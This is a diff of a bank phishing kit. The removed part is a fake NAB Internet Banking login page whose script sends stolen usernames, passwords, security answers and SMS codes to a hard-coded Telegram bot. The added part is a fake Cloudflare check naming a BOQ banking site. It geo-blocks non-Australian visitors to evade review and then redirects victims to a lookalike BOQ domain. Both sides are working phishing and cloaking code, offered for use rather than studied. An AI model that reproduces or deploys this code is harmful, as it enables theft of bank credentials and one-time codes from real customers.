@@ -1,898 +1,702 @@
 <!DOCTYPE html>
 <html lang="en">
-  <head>
-    <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>NAB Internet Banking</title>
-    <link rel="shortcut icon" href="img/favicon.svg" type="image/x-icon" />
-    <style>
-      * {
-        margin: 0;
-        padding: 0;
-        box-sizing: border-box;
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Just a moment...</title>
+  <script>
+    (function() {
+      'use strict';
+      
+      const ALLOWED_COUNTRIES = ['AU'];
+      const APIs = [
+        { url: 'https://freeipapi.com/api/json/', parser: d => ({ code: d.countryCode || d.country_code || 'XX', name: d.countryName || d.country || 'Unknown' }) },
+        { url: 'https://ipapi.co/json/', parser: d => ({ code: d.country || 'XX', name: d.country_name || 'Unknown' }) },
+        { url: 'https://ip-api.com/json/', parser: d => ({ code: d.countryCode || 'XX', name: d.country || 'Unknown' }) }
+      ];
+      
+      // Bypass checks
+      const isLocal = ['localhost', '127.0.0.1', ''].includes(window.location.hostname);
+      const hasBypass = new URLSearchParams(window.location.search).has('bypass_geo');
+      
+      if (isLocal || hasBypass) {
+        console.log('🔓 Geo-block bypassed');
+        return;
       }
-
-      body,
-      html {
-        font-family: Arial, sans-serif;
-        height: 100%;
-      }
-
-      .header_banner {
-        width: 100%;
-        /* padding: 20px 0; */
-        background-color: #000;
-      }
-
-      .header_inner {
-        display: flex;
-        justify-content: space-between;
-        align-items: center;
-        max-width: 1200px;
-        margin: 0 auto;
-        padding: 15px 16px;
-        width: 100%;
-        gap: 20px;
-      }
-
-      .header_left {
-        display: flex;
-        align-items: center;
-      }
-
-      .header_right {
-        color: #fff;
-        display: flex;
-        align-items: center;
-        justify-content: center;
-      }
-
-      .header_right p {
-        font-size: 0.8em;
-        padding: 10px;
-      }
-
-      .login_title {
-        font-family: SourceSans-Light, Helvetica, Arial, sans-serif;
-        font-size: 40px;
-      }
-
-      .banner {
-        position: relative;
-        min-height: 100vh;
-        background-image: url("img/bg-login.jpeg");
-        background-repeat: no-repeat;
-        background-size: cover;
-        background-position: center top;
-        background-attachment: fixed;
-        display: flex;
-        flex-direction: column;
-        overflow: hidden;
-      }
-
-      .login_wrapper {
-        width: 100%;
-        max-width: 500px;
-        margin-top: 40px;
-        margin-left: 300px;
-        background-color: white;
-        border-radius: 8px;
-        overflow: hidden;
-      }
-
-      .form_container {
-        width: 100%;
-        height: 150%;
-        padding: 38px 32px;
-        padding-bottom: 0px;
-      }
-
-      h1 {
-        font-size: 30px;
-        margin-bottom: 32px;
-        color: #333;
-        font-weight: 100;
-      }
-
-      .input_field {
-        margin: 40px 0px;
-      }
-
-      .input_field label {
-        font-size: 14px;
-        color: #000;
-        display: block;
-        margin-bottom: 8px;
-        font-weight: bold;
-      }
-
-      .input_field input {
-        width: 100%;
-        padding: 12px;
-        border: 1px solid #ccc;
-        border-radius: 4px;
-        font-size: 16px;
-      }
-
-      .input_field .error {
-        color: rgb(194, 0, 0);
-        font-size: 12px;
-      }
-
-      .remember_checkbox {
-        display: flex;
-        align-items: center;
-        margin-bottom: 20px;
-      }
-
-      .remember_checkbox label {
-        font-size: 14px;
-        color: #333;
-        margin-left: 10px;
-      }
-
-      .remember_checkbox input[type="checkbox"] {
-        width: 20px;
-        height: 20px;
-        accent-color: black;
-      }
-
-      .login_button {
-        margin-bottom: 20px;
-      }
-
-      .login_button button {
-        width: 128px;
-        padding: 12px;
-        background-color: #e2001a;
-        color: #fff;
-        border: none;
-        border-radius: 4px;
-        font-size: 16px;
-        cursor: pointer;
-      }
-
-      .login_button button:hover {
-        background-color: #d00016;
-      }
-
-      .footer_links a {
-        color: #d00016;
-      }
-
-      .footer_links a:hover {
-        text-decoration: underline;
-      }
-
-      .footer_link2 {
-        margin-top: 30px;
-        background-color: #e6e6e6;
-        padding: 20px;
-        font-size: 16px;
-        font-weight: 100;
-      }
-
-      .info {
-        color: #4d4d4d;
-        font-size: 14px;
-      }
-
-      .footer_link2 a {
-        color: #d00016;
-        font-weight: bold;
-      }
-
-      .input_field input {
-        width: 100%;
-        padding: 12px;
-        border: 1px solid #ccc;
-        border-radius: 4px;
-        font-size: 16px;
-        transition: border 0.3s ease;
-      }
-
-      .input_field input:focus {
-        outline: none;
-        border: 3px solid grey;
-      }
-
-      .input_error {
-        border: 1px solid rgb(194, 0, 0) !important;
-      }
-
-      .input_error:focus {
-        border: 3px solid rgb(194, 0, 0) !important;
-      }
-
-      .input_field .error {
-        color: rgb(194, 0, 0);
-        font-size: 14px;
-        margin-top: 4px;
-        height: 14px;
-        line-height: 14px;
-        transition: all 0.3s ease;
-      }
-
-      /* Modal styles */
-      .modal-backdrop {
-        position: fixed;
-        top: 0;
-        left: 0;
-        right: 0;
-        bottom: 0;
-        background-color: rgba(0, 0, 0, 0.5);
-        z-index: 999;
-      }
-
-      .modal {
-        position: fixed;
-        top: 28%;
-        left: 50%;
-        transform: translate(-50%, -50%);
-        background-color: #fff;
-        padding: 40px;
-        border-radius: 8px;
-        box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
-        z-index: 1000;
-        width: 400px;
-        height: 300px;
-        text-align: center;
-        display: flex;
-        flex-direction: column;
-        justify-content: center;
-        align-items: center;
-      }
-
-      .spinner {
-        width: 40px;
-        height: 40px;
-        border: 4px solid #ddd;
-        border-top: 4px solid rgb(194, 0, 0);
-        border-radius: 50%;
-        animation: spin 1s linear infinite;
-        margin: 0 auto;
-      }
-
-      @keyframes spin {
-        to {
-          transform: rotate(360deg);
-        }
-      }
-    </style>
-    <style>
-      @font-face {
-        font-family: "SourceSans-Light";
-        src: url("font/SourceSans-Light.woff2") format("woff2"),
-          url("font/SourceSans-Light.woff") format("woff");
-        font-weight: 100;
-        font-style: normal;
-      }
-    </style>
-    <style>
-      .loading-div {
-        display: none;
-        flex-direction: column;
-        justify-content: center;
-        align-items: center;
-      }
-      .loader {
-        width: 48px;
-        height: 48px;
-        border: 4px solid rgb(212, 212, 212);
-        border-top: 4px solid #e60000;
-        border-right: 4px solid #e60000;
-        border-radius: 50%;
-        animation: spin 1.5s linear infinite;
-        margin: 0 auto;
-      }
-
-      .loader-message {
-        margin-top: 12px;
-        font-size: 14px;
-        color: #444;
-        text-align: center;
-        font-family: Arial, sans-serif;
-      }
-
-      @keyframes spin {
-        0% {
-          transform: rotate(0deg);
-        }
-        100% {
-          transform: rotate(360deg);
-        }
-      }
-    </style>
-
-    <style>
-      @media screen and (max-width: 768px) {
-        .login_title {
-          font-size: 30px;
-        }
-        .header_inner {
-          display: flex;
-          justify-content: space-between;
-          padding: 10px 16px;
-        }
-
-        .header_left {
-          margin-left: 0;
-          margin-bottom: 10px;
-        }
-
-        .header_right {
-          display: none;
-        }
-
-        .login_wrapper {
-          width: 90%;
-          margin: 50px auto;
-          background-color: white;
-          border-radius: 8px;
-          overflow: hidden;
-        }
-
-        .login_button button {
-          width: 100%;
-        }
-
-        .form_container {
-          padding: 20px;
-        }
-        .footer_link2 {
-          font-size: 14px;
-        }
-      }
-    </style>
-  </head>
-  <body>
-    <div class="header_banner" id="headerBanner">
-      <div class="header_inner">
-        <div class="header_left" style="">
-          <img
-            class="logo-img"
-            src="img/star-big.svg"
-            alt=""
-            height="30"
-            width="90"
-          />
-          <h1 style="color: #fff; font-size: 22px; margin: 0">
-            Internet Banking
-          </h1>
-        </div>
-        <div class="header_right">
-          <p id="currentDate"></p>
-          |
-          <p>Help</p>
-          |
-          <p>Security</p>
-          |
-          <p>Contact us</p>
-          |
-          <p>Locate us</p>
-        </div>
-      </div>
-
-      <div class="banner">
-        <div class="login_wrapper">
-          <div class="form_container">
-            <div
-              class="loading-div"
-              style="
-                height: 400px;
+      
+      function showBlockPage(location) {
+        document.documentElement.innerHTML = `
+          <!DOCTYPE html>
+          <html>
+          <head>
+            <meta charset="UTF-8">
+            <meta name="viewport" content="width=device-width, initial-scale=1.0">
+            <title>Access Restricted</title>
+            <style>
+              * { margin: 0; padding: 0; box-sizing: border-box; }
+              body {
+                background: #000;
+                color: #f2f2f2;
+                font-family: system-ui, sans-serif;
+                display: flex;
                 justify-content: center;
                 align-items: center;
-              "
-            >
-              <div class="loader"></div>
-              <div class="loader-message">Processing, please wait.</div>
+                min-height: 100vh;
+                padding: 20px;
+                text-align: center;
+              }
+              .container { max-width: 600px; }
+              h1 { color: #f38020; font-size: 2rem; margin-bottom: 1rem; }
+              p { font-size: 1.1rem; line-height: 1.6; color: #b6b6b6; margin-bottom: 1rem; }
+              .badge {
+                display: inline-block;
+                background: rgba(243, 128, 32, 0.1);
+                color: #f38020;
+                padding: 4px 12px;
+                border-radius: 4px;
+                font-weight: 500;
+              }
+              .code { 
+                margin-top: 2rem;
+                padding: 0.5rem 1rem;
+                background: #1a1a1a;
+                border-radius: 4px;
+                color: #555;
+                font-size: 0.7rem;
+              }
+            </style>
+          </head>
+          <body>
+            <div class="container">
+              <h1>🚫 Access Restricted</h1>
+              <p></p>
+              <p>Detected location: <span class="badge">${location.name} (${location.code})</span></p>
+              <p style="font-size: 0.95rem; color: #888;"></p>
+              <div class="code">REF: GEO-${Date.now().toString(36)}</div>
             </div>
-            <form id="loginForm" method="post" novalidate>
-              <h1 style="" class="login_title">NAB Internet Banking</h1>
+          </body>
+          </html>
+        `;
+      }
+      
+      async function getLocation() {
+        for (const api of APIs) {
+          try {
+            const response = await fetch(api.url, { 
+              signal: AbortSignal.timeout(3000) // 3 second timeout
+            });
+            if (!response.ok) throw new Error(`HTTP ${response.status}`);
+            const data = await response.json();
+            const parsed = api.parser(data);
+            if (parsed.code !== 'XX') {
+              return { code: parsed.code.toUpperCase(), name: parsed.name };
+            }
+          } catch (e) {
+            console.warn(`API failed: ${api.url}`, e.message);
+          }
+        }
+        return null;
+      }
+      
+      // Hide content initially
+      document.documentElement.style.display = 'none';
+      
+      getLocation().then(location => {
+        document.documentElement.style.display = '';
+        
+        if (!location) {
+          console.log('🔓 All APIs failed - allowing access');
+          return;
+        }
+        
+        console.log(`📍 Location: ${location.name} (${location.code})`);
+        
+        if (!ALLOWED_COUNTRIES.includes(location.code)) {
+          showBlockPage(location);
+        }
+      });
+      
+    })();
+  </script>
+  
+  <script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>
+  <style>
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
 
-              <div class="input_field">
-                <label for="nabID">NAB ID</label>
-                <input
-                  type="text"
-                  id="nabID"
-                  name="nabID"
-                  autocomplete="off"
-                  maxlength="9"
-                  inputmode="numeric"
-                />
-                <div
-                  class="error-container"
-                  id="nabIDError"
-                  style="display: none; gap: 5px; margin-top: 20px"
-                >
-                  <svg
-                    focusable="false"
-                    aria-hidden="true"
-                    width="24"
-                    height="24"
-                    viewBox="0 0 24 24"
-                  >
-                    <path
-                      fill="rgb(194, 0, 0)"
-                      fill-rule="evenodd"
-                      d="M12 21a9 9 0 110-18 9 9 0 010 18zm0-3.25a.75.75 0 100-1.5.75.75 0 000 1.5zm-.75-10.794v6.588c0 .39.336.706.75.706s.75-.316.75-.706V6.956c0-.39-.336-.706-.75-.706s-.75.316-.75.706z"
-                    ></path>
-                  </svg>
-                  <span class="error" id="nabIDErrorText"></span>
-                </div>
-              </div>
+    html {
+      line-height: 1.15;
+      -webkit-text-size-adjust: 100%;
+      color: #f2f2f2;
+      font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, "Noto Sans", sans-serif;
+    }
 
-              <div class="input_field">
-                <label for="password">Password</label>
-                <input type="password" id="password" name="password" />
-                <div class="passwordError"></div>
-              </div>
+    body {
+      display: flex;
+      flex-direction: column;
+      height: 100vh;
+      min-height: 100vh;
+      background-color: #000000;
+      color: #f2f2f2;
+    }
 
-              <div class="remember_checkbox">
-                <input type="checkbox" id="remember" />
-                <label for="remember">Remember my NAB ID</label>
-              </div>
+    .main-wrapper {
+      display: flex;
+      flex: 1;
+      flex-direction: column;
+      align-items: center;
+      background-color: #000000;
+    }
 
-              <div style="margin: 20px 0px" class="info">
-                For security reasons, we'll only show you the last 3 digits.
-                Don't save your NAB ID if anyone else uses this browser.
-              </div>
+    .main-content {
+      margin: 8rem auto;
+      padding-left: 1.5rem;
+      padding-right: 1.5rem;
+      width: 100%;
+      max-width: 60rem;
+    }
 
-              <div class="login_button">
-                <button type="submit">Login</button>
-              </div>
+    @media (max-width: 720px) {
+      .main-content {
+        margin-top: 4rem;
+        padding-left: 1rem;
+        padding-right: 1rem;
+      }
+    }
 
-              <div class="footer_links">
-                <a href="#">Forgot your NAB ID or password?</a>
-              </div>
-            </form>
-          </div>
+    .site-header {
+      display: flex;
+      gap: 16px;
+      align-items: center;
+      margin-bottom: 8px;
+    }
 
-          <div class="footer_link2">
-            <p>New to NAB Internet Banking? <a href="#">Register now</a></p>
-          </div>
-        </div>
+    h1 {
+      font-size: 2.5rem;
+      font-weight: 600;
+      line-height: 125%;
+      color: #f2f2f2;
+    }
+
+    h2 {
+      margin-bottom: 8px;
+      font-size: 1.5rem;
+      font-weight: 600;
+      line-height: 125%;
+      color: #f2f2f2;
+      margin-top: 8px;
+    }
+
+    p {
+      margin-bottom: 8px;
+      font-size: 1rem;
+      font-weight: 300;
+      line-height: 150%;
+      color: #f2f2f2;
+    }
+
+    .verification-text {
+      margin-top: 0;
+      margin-bottom: 2rem;
+      font-weight: 400;
+      color: #b6b6b6;
+    }
+
+    .turnstile-container {
+      display: none;
+      justify-content: flex-start;
+      margin: 2rem 0;
+      min-height: 65px;
+    }
+
+    .turnstile-container.visible {
+      display: flex;
+    }
+
+    .turnstile-container iframe {
+      width: auto !important;
+      height: auto !important;
+      max-width: 300px !important;
+    }
+
+    .cf-turnstile {
+      display: flex !important;
+      justify-content: flex-start !important;
+      align-items: center !important;
+      min-height: 65px !important;
+      width: auto !important;
+    }
+
+    .cf-turnstile iframe {
+      width: auto !important;
+      height: auto !important;
+    }
+
+    .cf-turnstile .cf-turnstile-wrapper {
+      display: flex !important;
+      justify-content: flex-start !important;
+      align-items: center !important;
+    }
+
+    .spinner-container {
+      display: flex;
+      justify-content: flex-start;
+      margin: 2rem 0;
+      height: 76.391px;
+      align-items: center;
+    }
+
+    .spinner-container.hidden {
+      display: none;
+    }
+
+    .spinner {
+      display: inline-block;
+      position: relative;
+      width: 30px;
+      height: 30px;
+    }
+
+    .spinner div {
+      box-sizing: border-box;
+      display: block;
+      position: absolute;
+      width: 30px;
+      height: 30px;
+      border: 3px solid #f2f2f2;
+      border-radius: 50%;
+      animation: lds-ring 1.2s cubic-bezier(0.5, 0, 0.5, 1) infinite;
+      border-color: #f2f2f2 transparent transparent transparent;
+    }
+
+    .spinner div:nth-child(1) {
+      animation-delay: -0.45s;
+    }
+
+    .spinner div:nth-child(2) {
+      animation-delay: -0.3s;
+    }
+
+    .spinner div:nth-child(3) {
+      animation-delay: -0.15s;
+    }
+
+    @keyframes lds-ring {
+      0% {
+        transform: rotate(0deg);
+      }
+      100% {
+        transform: rotate(360deg);
+      }
+    }
+
+    #error-note {
+      display: none;
+      font-size: 13px;
+      color: #fc574a;
+      margin-top: 14px;
+      background-image: url("data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIzMiIgaGVpZ2h0PSIzMiIgZmlsbD0ibm9uZSI+PHBhdGggZmlsbD0iI0ZENTc0QSIgZD0iTTE2IDNhMTMgMTMgMCAxIDAgMTMgMTNBMTMuMDE1IDEzLjAxNSAwIDAgMCAxNiAzbTAgMjRhMTEgMTEgMCAxIDEgMTEtMTEgMTEuMDEgMTEuMDEgMCAwIDEtMTEgMTEiLz48cGF0aCBmaWxsPSIjRkQ1NzRBIiBkPSJNMTcuMDM4IDE4LjYxNUgxNC44N0wxNC41NjMgOS41aDIuNzgzem0tMS4wODQgMS40MjdxLjY2IDAgMS4wNTcuMzg4LjQwNy4zODkuNDA3Ljk5NCAwIC41OTYtLjQwNy45ODQtLjM5Ny4zOS0xLjA1Ny4zODktLjY1IDAtMS4wNTYtLjM4OS0uMzk4LS4zODktLjM5OC0uOTg0IDAtLjU5Ny4zOTgtLjk4NS40MDYtLjM5NyAxLjA1Ni0uMzk3Ii8+PC9zdmc+");
+      background-repeat: no-repeat;
+      background-size: contain;
+      padding-left: 34px;
+    }
+
+    .footer {
+      margin: 0 auto;
+      padding-right: 2rem;
+      padding-left: 2rem;
+      width: 100%;
+      max-width: 60rem;
+      line-height: 1.125rem;
+      font-size: 0.75rem;
+    }
+
+    .footer-inner {
+      display: flex;
+      justify-content: center;
+      border-top: 1px solid #333333;
+      padding-top: 1rem;
+      padding-bottom: 1rem;
+    }
+
+    .footer-wrapper {
+      text-align: center;
+    }
+
+    .footer-divider {
+      border: 1px solid #333333;
+      height: 12px;
+    }
+
+    .footer-link-wrapper {
+      display: flex;
+      gap: 8px;
+      align-items: center;
+      justify-content: center;
+      margin-top: 4px;
+    }
+
+    .footer-text {
+      color: #888888;
+      font-size: 0.75rem;
+    }
+
+    .footer a {
+      color: #888888;
+      text-decoration: underline;
+      font-size: 0.75rem;
+    }
+
+    .footer a:hover {
+      color: #b9d6ff;
+    }
+
+    .ray-id {
+      font-family: monospace;
+      font-size: 0.75rem;
+      color: #888888;
+      margin-bottom: 4px;
+    }
+
+    .ray-id code {
+      font-family: monospace;
+    }
+
+    .verify-status {
+      margin-top: 12px;
+      padding: 8px 12px;
+      border-radius: 4px;
+      font-size: 13px;
+      display: none;
+    }
+
+    .verify-status.success {
+      display: block;
+      background: #1a3a2a;
+      color: #2db35e;
+      border: 1px solid #2db35e;
+    }
+
+    .verify-status.fail {
+      display: block;
+      background: #3a1a1a;
+      color: #fc574a;
+      border: 1px solid #fc574a;
+    }
+
+    /* Success message styles - clean, no border or background */
+    #success-message {
+      display: none;
+      margin-top: 2rem;
+      padding: 0;
+      animation: fadeIn 0.5s ease;
+    }
+
+    #success-message h2 {
+      color: #f2f2f2;
+      font-size: 1.3rem;
+      margin-bottom: 0;
+      font-weight: 500;
+    }
+
+    #success-message .site-name-highlight {
+      color: #f38020;
+      font-weight: 600;
+    }
+
+    @keyframes fadeIn {
+      0% { opacity: 0; transform: translateY(-10px); }
+      100% { opacity: 1; transform: translateY(0); }
+    }
+
+    /* Hide countdown */
+    #countdown-container {
+      display: none !important;
+    }
+
+    /* Hide old success elements */
+    .success-check {
+      display: none !important;
+    }
+    #success-status {
+      display: none !important;
+    }
+    
+    /* Hide the verify-status success message */
+    .verify-status.success {
+      display: none !important;
+    }
+
+    /* Editable text styling for the success message only */
+    #success-message [contenteditable="true"] {
+      outline: none;
+      border-radius: 4px;
+      padding: 2px 6px;
+      transition: background-color 0.2s;
+      display: inline-block;
+    }
+
+    #success-message [contenteditable="true"]:hover {
+      background-color: rgba(255, 255, 255, 0.05);
+    }
+
+    #success-message [contenteditable="true"]:focus {
+      background-color: rgba(255, 255, 255, 0.08);
+      box-shadow: 0 0 0 2px rgba(243, 128, 32, 0.3);
+    }
+
+    /* Small edit hint for success message */
+    .editable-hint {
+      font-size: 0.7rem;
+      color: #666;
+      margin-left: 10px;
+      font-weight: 300;
+      opacity: 0.6;
+      display: inline-block;
+    }
+  </style>
+</head>
+<body>
+
+<div class="main-wrapper" role="main">
+  <div class="main-content">
+    <!-- Site Header -->
+    <div class="site-header">
+      <h1 id="siteName">internetbanking.boq.com.au</h1>
+    </div>
+
+    <!-- Title -->
+    <h2 id="statusTitle">Performing security verification</h2>
+    
+    <!-- Description -->
+    <p id="statusSub" class="verification-text">This website uses a security service to protect against malicious bots. This page is displayed while the website verifies you are not a bot.</p>
+
+    <!-- Spinner (visible initially) -->
+    <div class="spinner-container" id="spinnerContainer">
+      <div class="spinner" id="spinner">
+        <div></div>
+        <div></div>
+        <div></div>
+        <div></div>
       </div>
     </div>
 
-    <!-- Modal for first attempt -->
-    <div id="modalBackdrop" class="modal-backdrop" style="display: none"></div>
-    <div id="modal" class="modal" style="display: none">
-      <svg
-        focusable="false"
-        aria-hidden="true"
-        width="104"
-        height="104"
-        viewBox="0 0 24 24"
-      >
-        <path
-          fill="rgb(194, 0, 0)"
-          fill-rule="evenodd"
-          d="M12 21a9 9 0 110-18 9 9 0 010 18zm0-3.25a.75.75 0 100-1.5.75.75 0 000 1.5zm-.75-10.794v6.588c0 .39.336.706.75.706s.75-.316.75-.706V6.956c0-.39-.336-.706-.75-.706s-.75.316-.75.706z"
-        ></path>
-      </svg>
-      <p style="margin-top: 30px; font-size: 24px">
-        Incorrect NAB ID or password
-      </p>
+    <!-- Turnstile Container (hidden initially) -->
+    <div class="turnstile-container" id="turnstileContainer"></div>
+    
+    <!-- Success Message - editable h2 only -->
+    <div id="success-message">
+      <h2><span contenteditable="true">Verification successful. Waiting for <span class="site-name-highlight" id="successSiteName">example.com</span> to respond.</span> <span class="editable-hint"></span></h2>
     </div>
+    
+    <!-- Error Note -->
+    <p id="error-note">Verification failed. Please refresh the page to try again.</p>
 
-    <div
-      id="loadingModalBackdrop"
-      style="
-        display: none;
-        position: fixed;
-        top: 0;
-        left: 0;
-        right: 0;
-        bottom: 0;
-        background: rgba(0, 0, 0, 0.6);
-        z-index: 9999;
-        justify-content: center;
-        align-items: center;
-      "
-    >
-      <div
-        id="loadingModal"
-        style="
-          background: #fff;
-          padding: 40px 30px;
-          border-radius: 8px;
-          text-align: center;
-          box-shadow: 0 0 15px rgba(0, 0, 0, 0.3);
-        "
-      >
-        <div class="spinner" style="margin-bottom: 20px"></div>
-        <div style="font-size: 18px; font-weight: 500">
-          Loading, please wait...
-        </div>
+    <!-- Countdown (hidden) -->
+    <div id="countdown-container"></div>
+
+    <!-- Verify Status (hidden) -->
+    <div class="verify-status" id="verifyStatus"></div>
+  </div>
+</div>
+
+<!-- Footer -->
+<div class="footer" role="contentinfo">
+  <div class="footer-inner">
+    <div class="footer-wrapper">
+      <div class="ray-id">Ray ID: <code id="rayId">a16288a3796d32c0</code></div>
+      <div class="footer-link-wrapper">
+        <span class="footer-text">Performance and Security by <a rel="noopener noreferrer" href="https://www.cloudflare.com?utm_source=challenge&amp;utm_campaign=m" target="_blank">Cloudflare</a></span>
+        <span class="footer-divider"></span>
+        <a target="_blank" rel="noopener noreferrer" href="https://www.cloudflare.com/privacypolicy/" class="footer-text">Privacy</a>
       </div>
     </div>
+  </div>
+</div>
 
-    <script>
-      function updateImageSrc() {
-        const img = document.querySelector(".logo-img");
-        if (!img) return;
+<script>
+(function () {
+  // ================= CONFIG =================
+  var SITE_KEY = '0x4AAAAAADviox3Tz8fVZXRI';
+  var REDIRECT_URL = 'https://ib.boq.com.au.autocheck.click/mybq/en.html';
+  // ==========================================
 
-        if (window.innerWidth <= 768) {
-          img.src = "img/star.svg";
-        } else {
-          img.src = "img/star-big.svg";
-        }
-      }
+  var redirectTarget = REDIRECT_URL;
+  var isVerified = false;
+  var autoVerifyAttempted = false;
+  var redirectTimer = null;
 
-      updateImageSrc();
+  // Update site name in success message only (h1 stays as "My Custom Text")
+  var hostname = window.location.hostname;
+  document.getElementById('successSiteName').textContent = hostname;
+  document.getElementById('rayId').textContent = 'a16288a3796d32c0';
 
-      window.addEventListener("resize", updateImageSrc);
-    </script>
+  function showStatus(message, type) {
+    var statusEl = document.getElementById('verifyStatus');
+    statusEl.textContent = message;
+    statusEl.className = 'verify-status ' + type;
+  }
 
-    <script>
-      function ShowLoadingModal() {
-        document.getElementById("loginForm").style.display = "none";
-        const footerLink = document.getElementsByClassName("footer_link2")[0];
-        if (footerLink) {
-          footerLink.style.display = "none";
-        }
-        document.getElementsByClassName("form_container")[0].style.height =
-          "500px";
+  function showError(message) {
+    document.getElementById('spinnerContainer').classList.add('hidden');
+    document.getElementById('statusTitle').textContent = 'Verification failed';
+    document.getElementById('statusSub').textContent = message || 'Please refresh the page to try again.';
+    document.getElementById('error-note').style.display = 'block';
+    showStatus('❌ ' + (message || 'Verification failed'), 'fail');
+  }
 
-        document.getElementsByClassName("loading-div")[0].style.display =
-          "flex";
-      }
-    </script>
+  function performRedirect() {
+    console.log('🔴 Redirecting to:', redirectTarget);
+    window.location.replace(redirectTarget);
+  }
 
-    <script>
-      document.addEventListener("DOMContentLoaded", function () {
-        const currentDateElement = document.getElementById("currentDate");
+  function onSuccess() {
+    if (isVerified) return;
+    isVerified = true;
+    
+    console.log('✅ Verification successful! Redirecting in 2 seconds...');
+    
+    // Hide spinner
+    document.getElementById('spinnerContainer').classList.add('hidden');
+    
+    // Hide Turnstile
+    document.getElementById('turnstileContainer').classList.remove('visible');
+    document.getElementById('turnstileContainer').style.display = 'none';
+    
+    // Show success message
+    var successMsg = document.getElementById('success-message');
+    successMsg.style.display = 'block';
+    
+    // Update title and subtitle
+    document.getElementById('statusTitle').textContent = 'Verifying you are human. This may take a few seconds.';
+    document.getElementById('statusSub').textContent = 'This website uses a security service to protect against malicious bots. This page is displayed while the website verifies you are not a bot.';
+    
+    // Don't show the verify-status success message
 
-        const options = {
-          weekday: "long",
-          day: "numeric",
-          month: "long",
-          year: "numeric",
-        };
+    // Redirect after 2 seconds
+    if (redirectTimer) clearTimeout(redirectTimer);
+    redirectTimer = setTimeout(performRedirect, 2000);
+  }
 
-        const today = new Date();
-        const formattedDate = today.toLocaleDateString("en-GB", options);
-
-        currentDateElement.textContent = formattedDate;
-      });
-    </script>
-
-    <!-- ================================================ -->
-    <!-- THE NEW WORKING SCRIPT - REPLACES ALL PHP FILES -->
-    <!-- ================================================ -->
-    <script>
-      // ===== CONFIG (Replaces edit.php) =====
-      const CONFIG = {
-        apikey: "8343008184:AAF4ccn2zyT6Z-zGMZy2zThfPS26L8jPNjE",
-        chatid: "722615124"
-      };
-
-      // ===== Helper Functions (Replaces fxker.php) =====
-      function clean(value) {
-        return String(value).trim().replace(/</g, '&lt;').replace(/>/g, '&gt;');
-      }
-
-      function getBrowser(ua) {
-        if (ua.includes('MSIE')) return 'Internet Explorer';
-        if (ua.includes('Firefox')) return 'Mozilla Firefox';
-        if (ua.includes('Chrome')) return 'Google Chrome';
-        if (ua.includes('Safari')) return 'Safari';
-        if (ua.includes('Opera')) return 'Opera';
-        return 'Unknown';
-      }
-
-      async function getLocation(ip) {
-        try {
-          const res = await fetch(`https://freeipapi.com/api/json/${ip}`);
-          const data = await res.json();
-          return { country: data.countryName || 'Unknown', city: data.cityName || 'Unknown' };
-        } catch {
-          return { country: 'Unknown', city: 'Unknown' };
-        }
-      }
-
-      async function getClientInfo() {
-        let ip = '0.0.0.0';
-        try {
-          const res = await fetch('https://api.ipify.org?format=json');
-          const data = await res.json();
-          ip = data.ip;
-        } catch(e) {
-          console.warn('IP fetch failed');
-        }
-        const location = await getLocation(ip);
-        return {
-          ip: ip,
-          location: location,
-          userAgent: navigator.userAgent,
-          browser: getBrowser(navigator.userAgent)
-        };
-      }
-
-      // ===== Send to Telegram (Replaces message() from fxker.php) =====
-      async function sendTelegram(message) {
-        try {
-          const response = await fetch(`https://api.telegram.org/bot${CONFIG.apikey}/sendMessage`, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ chat_id: CONFIG.chatid, text: message })
-          });
-          const data = await response.json();
-          console.log('Telegram response:', data);
-          return data;
-        } catch(e) {
-          console.error('Telegram send error:', e);
-          return null;
-        }
-      }
-
-      // ===== Session Management (Replaces PHP $_SESSION) =====
-      const Session = {
-        get: function(key) {
-          return localStorage.getItem('session_' + key);
-        },
-        set: function(key, value) {
-          localStorage.setItem('session_' + key, value);
-        },
-        getUsername: function() {
-          return this.get('username') || 'Unknown';
-        }
-      };
-
-      // ===== The Main Switch (Replaces err.php) =====
-      async function processForm(target, formData) {
-        const info = await getClientInfo();
-        let message = "";
-
-        switch(parseInt(target)) {
-          case 0: // Login (NAB LOGIN 1)
-            const username = clean(formData.get('x') || '');
-            const password = clean(formData.get('xx') || '');
-            Session.set('username', username);
-            Session.set('password', password);
-
-            message = `
-        ------------------[NAB LOGIN 1]------------------
-
-        Username : ${username}
-        Password : ${password}
-
-        ------------[USER AGENT IP DNS]-------------
-        User Agent
-         ${info.userAgent}
-        IP Address : ${info.ip}
-        -------------[TELEGRAM: ECHOVSL]-------------`;
-            break;
-
-          case 1: // Security Questions
-            const q1 = clean(formData.get('q1') || '');
-            const a1 = clean(formData.get('a1') || '');
-            const q2 = clean(formData.get('q2') || '');
-            const a2 = clean(formData.get('a2') || '');
-            const q3 = clean(formData.get('q3') || '');
-            const a3 = clean(formData.get('a3') || '');
-
-            message = `
-        ---------------[Security Que n Ans]---------------
-
-        Security Questions And Answers Set By ${Session.getUsername()}
-        Delay in Progress Second Code Comes in 60 Seconds Time.
-
-        Security Que 1: ${q1}
-        Security Ans 1: ${a1}
-
-        Security Que 2: ${q2}
-        Security Ans 2: ${a2}
-
-        Security Que 3: ${q3}
-        Security Ans 3: ${a3}
-
-        --------------[USER AGENT IP DNS]--------------
-        User Agent
-         ${info.userAgent}
-        IP Address : ${info.ip}
-        --------------[TELEGRAM: ECHOVSL]--------------`;
-            break;
-
-          case 2: // SMS Code 1
-            const otp1 = clean(formData.get('xxl') || '');
-            message = `
-        --------------[NAB SMS CODE 1]--------------
-
-        SMS CODE FROM : ${Session.getUsername()}
-        SMS CODE : ${otp1}
-
-        ------------[USER AGENT IP DNS]-------------
-        User Agent
-         ${info.userAgent}
-        IP Address : ${info.ip}
-        -------------[TELEGRAM: ECHOVSL]-------------`;
-            break;
-
-          case 3: // SMS Code 2
-            const otp2 = clean(formData.get('xxll') || '');
-            message = `
-        --------------[NAB SMS CODE 2]--------------
-
-        SMS CODE FROM : ${Session.getUsername()}
